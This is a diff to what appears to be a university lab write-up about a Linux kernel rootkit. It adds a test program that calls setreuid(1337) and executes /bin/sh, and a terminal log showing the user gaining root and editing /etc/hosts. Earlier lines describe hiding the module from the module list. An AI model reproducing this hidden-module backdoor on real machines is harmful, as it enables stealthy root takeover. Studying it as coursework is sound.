@@ -161,7 +161,33 @@ e1000                 145174  0
 
 7. These two lines prevent the rootkit from appearing in the module list.
 
-8. We may have run to rebooting the system to remove the module when it
+8. We may resort to rebooting the system to remove the module when it
    is hidden.
 
-9. 
+9. Real rootin'
+   test.c calls setreuid(1337,1337) and execve /bin/sh 0 0.
+### listing: test.c
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+int main(void)
+{
+    char **argv = {NULL};
+    setreuid(1337, 1337);
+    execve("/bin/sh", argv, NULL);
+    return 0;
+}
+###
+    Here it is in action:
+###
+user@cu-cs-vm:~/os3753/rkit_as1$ ./a.out
+# echo "0.0.0.0 facebook.com" >> /etc/hosts
+# w00t
+sh: 2: w00t: not found
+# id    
+uid=0(root) gid=1000(user) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),1000(user)
+# exit
+user@cu-cs-vm:~/os3753/rkit_as1$
+###
+
